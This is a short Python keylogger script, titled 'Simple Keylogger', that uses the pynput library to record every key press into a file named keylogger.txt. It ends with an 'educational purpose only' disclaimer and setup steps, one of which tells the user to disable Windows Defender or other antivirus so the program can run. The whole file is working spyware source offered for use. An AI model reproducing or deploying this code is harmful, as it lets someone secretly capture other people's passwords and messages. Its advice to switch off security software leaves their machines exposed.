print("<-------------------Simple Keylogger------------------->")
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keylogger.txt","a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")
            
if __name__=="__main__":
    listener =keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
    
#This program is for Educational purpose only!!
#Instructions:
    """
    1. pip install pynput
    2. write code in python test
    3. disable windows defender or anti-virus so that our program can run ;)
    4. check keylogger.txt for output
    Let's  how this works"""
    